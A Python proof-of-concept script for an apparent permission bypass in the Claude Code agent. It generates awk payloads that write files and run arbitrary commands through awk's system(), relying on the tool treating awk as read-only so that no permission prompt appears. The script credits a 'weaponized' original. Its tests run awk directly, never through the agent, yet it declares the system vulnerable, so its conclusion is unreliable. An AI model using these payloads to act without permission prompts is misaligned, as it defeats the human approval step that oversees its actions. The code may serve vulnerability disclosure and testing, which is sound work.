#!/usr/bin/env python3
"""
Claude Code Permission Bypass - Non‑destructive Proof of Concept

This PoC demonstrates that the misclassification of 'awk' as a 'read' command
allows writing files and executing arbitrary commands without permission prompts.
It performs safe, ephemeral operations in a temporary directory.

Based on the original weaponized exploit by Andrew C. Doorman, YogSotho, BrokenSec.
"""

import argparse
import os
import subprocess
import sys
import tempfile
import time


class AwkPayloadGenerator:
    """Generate awk payloads using environment variables for safety."""

    @staticmethod
    def _sh_quote(s: str) -> str:
        """Single-quote a string for shell use, escaping embedded single quotes."""
        return "'" + s.replace("'", "'\"'\"'") + "'"

    @staticmethod
    def file_write_payload(path: str, content: str) -> str:
        """
        Return a shell command that uses awk to write `content` to `path`.
        Uses environment variables to avoid injection issues.
        """
        q_path = AwkPayloadGenerator._sh_quote(path)
        q_content = AwkPayloadGenerator._sh_quote(content)
        return (
            f"AWK_PATH={q_path} AWK_CONTENT={q_content} "
            f"awk '{{ print ENVIRON[\"AWK_CONTENT\"] > ENVIRON[\"AWK_PATH\"] }}'"
        )

    @staticmethod
    def command_exec_payload(command: str) -> str:
        """
        Return a shell command that uses awk's system() to execute `command`.
        """
        q_cmd = AwkPayloadGenerator._sh_quote(command)
        return f"AWK_CMD={q_cmd} awk '{{ system(ENVIRON[\"AWK_CMD\"]) }}'"


class ClaudeCodePoC:
    """Non‑destructive proof of concept for the permission bypass."""

    def __init__(self, dry_run: bool = False, verbose: bool = False):
        self.dry_run = dry_run
        self.verbose = verbose
        self.generator = AwkPayloadGenerator()

    def _run_command(self, cmd: str) -> tuple[bool, str]:
        """
        Execute a shell command and return (success, output/error).

        In dry-run mode, prints the command and returns (True, "DRY RUN").
        """
        if self.dry_run:
            print(f"[DRY RUN] Would execute: {cmd}")
            return True, "DRY RUN"

        if self.verbose:
            print(f"[VERBOSE] Executing: {cmd}")

        try:
            proc = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=10,
                check=False,
            )
            stdout = proc.stdout
            stderr = proc.stderr
            if proc.returncode != 0:
                error = stderr.strip() or stdout.strip() or f"exit code {proc.returncode}"
                return False, error
            return True, stdout
        except subprocess.TimeoutExpired:
            return False, "Command timed out after 10s"
        except FileNotFoundError:
            return False, "Command not found (awk or shell not available)"
        except Exception as e:
            return False, str(e)

    def test_file_write(self, path: str, content: str) -> bool:
        """
        Attempt to write a file using the awk bypass.

        Returns True if the file was created with exactly the same content
        (allowing for the trailing newline that awk's `print` adds).
        """
        cmd = self.generator.file_write_payload(path, content)
        success, msg = self._run_command(cmd)
        if not success:
            print(f"[-] File write failed: {msg}")
            return False

        if self.dry_run:
            return True

        # Verify content (print adds a newline)
        try:
            with open(path, 'r') as f:
                actual = f.read()
            expected = content + '\n'
            if actual == expected:
                print(f"[+] File write succeeded: {path} contains '{content}'")
                return True
            else:
                print(f"[-] File content mismatch: expected '{expected}', got '{actual}'")
                return False
        except Exception as e:
            print(f"[-] Could not read written file: {e}")
            return False

    def test_command_exec(self, command: str) -> bool:
        """
        Attempt to execute a harmless command via awk's system().

        Returns True if the command executed with exit code 0.
        """
        cmd = self.generator.command_exec_payload(command)
        success, output = self._run_command(cmd)
        if self.dry_run:
            return success

        if success:
            print(f"[+] Command execution succeeded. Output: {output}")
        else:
            print(f"[-] Command execution failed: {output}")
        return success

    def check_awk(self) -> bool:
        """Check if awk is available in the system."""
        try:
            subprocess.run(["awk", "--version"], capture_output=True, check=False)
            return True
        except FileNotFoundError:
            return False

    def run_full_test(self) -> bool:
        """
        Run the complete PoC test suite with temporary files.

        Returns True if all tests pass (bypass is confirmed).
        """
        print("[*] Starting Claude Code permission bypass PoC (non‑destructive)")

        if not self.check_awk():
            print("[-] 'awk' command not found. This PoC requires awk.")
            return False

        # Use a temporary directory for all artifacts
        with tempfile.TemporaryDirectory(prefix="claude_poc_") as tmpdir:
            test_file = os.path.join(tmpdir, "poc_test.txt")
            test_content = f"PoC successful at {time.ctime()}"
            harmless_cmd = "echo 'PoC command execution works'"

            print(f"[*] Test 1: Writing to {test_file} using awk")
            write_ok = self.test_file_write(test_file, test_content)
            if not write_ok:
                print("[!] File write test failed – vulnerability may not exist.")
                return False

            print("[*] Test 2: Executing harmless command via awk system()")
            exec_ok = self.test_command_exec(harmless_cmd)
            if not exec_ok:
                print("[!] Command execution test failed – vulnerability may be limited.")
                return False

            print("[+] All tests passed! The permission bypass is confirmed.")
            return True

    def cleanup(self):
        """No persistent artifacts are created; temporary directory is auto‑cleaned."""
        pass


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Claude Code Permission Bypass PoC (non‑destructive)"
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Show what would be done without executing any commands",
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Print additional debug information",
    )
    args = parser.parse_args()

    poc = ClaudeCodePoC(dry_run=args.dry_run, verbose=args.verbose)

    try:
        success = poc.run_full_test()
        if success:
            print("\n[+] PoC completed successfully – the vulnerability is present.")
            print("[!] This system is vulnerable to Claude Code permission bypass.")
            return 0
        else:
            print("\n[-] PoC failed – the vulnerability may not be exploitable.")
            print("[*] This does not guarantee the system is secure; further investigation is advised.")
            return 1
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        return 130
    finally:
        poc.cleanup()


if __name__ == "__main__":
    sys.exit(main())
